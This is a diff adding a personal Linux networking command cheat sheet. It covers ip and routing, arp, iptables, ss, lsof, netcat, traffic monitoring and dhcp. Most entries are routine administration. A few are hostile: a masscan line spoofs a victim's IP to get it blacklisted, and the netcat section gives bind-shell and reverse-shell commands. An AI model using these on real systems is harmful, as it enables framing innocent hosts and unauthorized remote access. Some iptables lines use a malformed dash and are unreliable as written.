@@ -1,0 +1,300 @@
+device management
+=================
+
+# add an ip address for a device
+ip addr add 192.168.1.1/24 broadcast 192.168.1.255 dev eth0
+
+# add a defualt route for packets for a device
+ip route add default via 192.168.1.1 dev eth0
+
+# remove ip addresses for a device
+ip addr flush dev eth0
+
+# remove routes for a device
+ip route flush dev eth0
+
+# add lan route for a device
+ip route add 192.168.0.0/24 dev eth0
+
+# add default route for a device
+ip route add default via 192.168.0.1 dev eth0
+
+# remove virtual interface
+ip link delete dummy0
+
+# watch for netlink messages
+ip monitor all
+
+# change the mtu of a device
+ip link set dev tun0 mtu 1350
+
+# change mac address of a device
+ip link set dev eth0 address AA:BB:CC:DD:EE:FF
+
+# create a bridge
+ip link add br0 type bridge
+ip link set dev eth0 master br0
+ip link set dev eth1 master br0
+---
+brctl addbr br0
+brctl addif br0 eth0 eth1
+
+# list of modes used in bonding
+0, balance-rr		round-robin for fault tolerance and load balancing
+1, active-backup	active-backup mode for fault tolerance
+2, balance-xor		XOR for fault tolerance and load balancing
+3, broadcast		broadcast for fault tolerance; all transmissions are
+			sent on all slave interfaces
+4, 802.3ad		IEEE 802.3ad dynamic link aggregation mode; creates
+			aggregation groups with the same speed-duplex settings
+5, balance-tlb		Transmit Load Balancing (TLB) mode for fault tolerance
+			and load balancing
+6, balance-alb		Active Load Balancing (ALB) mode for fault tolerance
+			and load balancing
+
+# check what bonding mode is enabled and what interfaces are used in a bond
+cat /proc/net/bonding/bond0
+
+
+
+route setup
+===========
+
+# get a default gateway
+/sbin/ip route | awk '/default/ { print $3 }'
+
+# create another routing table
+echo 200 <table-name> >> /etc/iproute2/rt_tables
+ip route add <NET1> dev <DEV1> src <SRC1> table <NAME1>
+ip route add default via <IP1> table <NAME1>
+ip rule add from <IP1> table <NAME1>
+
+# list all routing entries in all tables
+ip route show table all
+
+# list all rules
+ip rule show
+
+
+
+arp
+===
+
+# show arp table
+ip n
+---
+ip neigh
+---
+arp -a
+
+# add and delete an entry in arp table
+ip neigh add 192.168.0.1 lladdr 00:c0:7b:7d:00:c8 dev eth0
+ip neigh del 192.168.0.1 dev eth0
+
+# clear entire arp table for a device
+ip neighbor flush dev eth0
+
+# show hosts on the local network
+arp-scan --interface=eth0 --localnet
+arp-scan -I eth0 -l
+
+# add an entry in arp table
+arp -s 192.168.1.200 11:22:33:44:55:66
+
+
+
+iptables
+========
+
+# show rules together with line numbers
+iptables -nvL --line-numbers
+
+# delete a rule on a specific line
+sudo iptables -D INPUT ${line_id}
+
+# add a rule
+iptables -A INPUT -p TCP –dport 80 -j ACCEPT
+
+# add a drop rule
+iptables -A INPUT -p TCP –dport 22 -j DROP
+
+# removes all the rules in INPUT table
+iptables -F INPUT
+
+# save and restore rules
+iptables-save > /etc/iptables/iptables.rules
+iptables-restore < /etc/iptables/iptables.rules
+
+
+
+sys connections
+===============
+
+# show open network connections and unix sockets with ss (netstat's deprecated)
+# ss - most useful parameters
+-u      show udp only
+-t      show tcp only
+-n      numbers, don't resolve host and port names
+-l      show only listenning network ports and unix sockets
+-p      processes using sockets
+-e      extended information
+-a      show all
+-4 / -6 only ipv4 or ipv6
+
+# get a number of opened connections
+cat /proc/sys/net/netfilter/nf_conntrack_count
+
+# list opened ports with lsof
+lsof -i
+
+# lsof - useful parameters
+-i 		show services listening on network
+-i 4		only ipv4
+-i tcp		only tcp services
+-i :80		only services on port 80
+-i tcp:80	only tcp services on port 80
+-l		show all services that are listening
+-n		numbers, don't resolve host and port names
+-p 101		only information on process with PID 101
+-a		selection options are ANDed
+
+# show traffic stats per device
+ip -s -h a
+
+
+
+tracing
+=======
+
+# show a path to the server with ICMP
+traceroute ddg.co
+
+# find mtu for the interface
+traceroute -F 1.1.1.1 1500
+traceroute -F 1.1.1.1 1420
+traceroute -F 1.1.1.1 600
+
+
+
+misc
+====
+
+# deamon that starts programs appropriate for a request from network
+xinetd
+
+# benchmark the connection speed - server/client
+iperf3 -s  -f M
+iperf3 -c 192.168.1.1 -i 1 -f M -t 60
+
+# check connection mtu
+ping -M do -s 1500 -c 1 www.example.com
+
+# spoof ip address to get it blacklisted
+masscan --src-ip <victim_ip> -p 23 0.0.0.0/0 --rate=80000
+
+# wake onther host on lan via magic packet (wol)
+wakeonlan  21:53:1c:42:86:dd
+
+# get external ip from a service
+wget -cqO- http://ident.me
+wget -cqO- http://v4.ident.me
+wget -cqO- http://v6.ident.me
+
+# mullvad test commands
+wget -cqO- https://am.i.mullvad.net/json
+wget -cqO- https://ipv4.am.i.mullvad.net/port/13079
+
+# show info on current host from shodan
+w3m -dump -T text/html https://me.shodan.io
+
+
+
+netcat
+======
+
+# setup a server
+nc -nvlp 4444
+
+# connect to a server
+nc -nv 192.169.0.1 4444
+
+# setup a server and redirect all traffic to a file
+nc -nvlp 4444 > file1.bin
+
+# setup a server and redirect all text traffic to a file
+ncat -lkp 4444 | strings >> file1.txt
+
+# connect to a server and send a file there
+nc -nv 192.169.0.1 4444 < input.bin
+
+# check if port is opened
+nc -zv 127.0.0.1 22
+
+# setup an encrypted server
+ncat -nvlp 4444 --ssl
+
+# connect to an encrypted server
+ncat -nv 192.169.0.1 4444 --ssl
+
+# setup a server with a bind shell
+ncat -nvlp 4444 -e cmd.exe
+
+# connect to a server and provide a reverse shell
+ncat -nv 192.168.0.1 -e /bin/bash
+
+
+
+network monitoring
+==================
+
+# show traffic per process
+nethogs -d 5
+
+# nethogs parameters' list
+-r	sort by received values
+-s	sort by the sent values
+-t      trace connections as they appear
+-a      monitor all devices
+
+# show traffic per socket
+iftop
+tcptrack
+
+# show general traffic stats
+vnstat
+
+
+
+dhcp
+====
+
+# get info from dhcp server without changing any system settings (test)
+dhcpcd -T
+
+# get address with debug info and without forking into background
+/sbin/dhcpcd -b -4 -d -B eth0
+
+
+
+docs
+====
+
+# tcp packet header structure
+man tcpdump
+
+# ICMP codes
+/usr/include/linux/icmp.h
+
+# ip protocol numbers
+/usr/share/nmap/nmap-protocols
+/usr/share/iana-etc/protocol-numbers.iana
+
+# port numbers and default services
+/etc/services
+/usr/share/nmap/nmap-services
+/usr/share/iana-etc/port-numbers.iana
+
+# mac prefixes
+/usr/share/nmap/nmap-mac-prefixes
+/usr/share/arp-scan/ieee-oui.txt
+
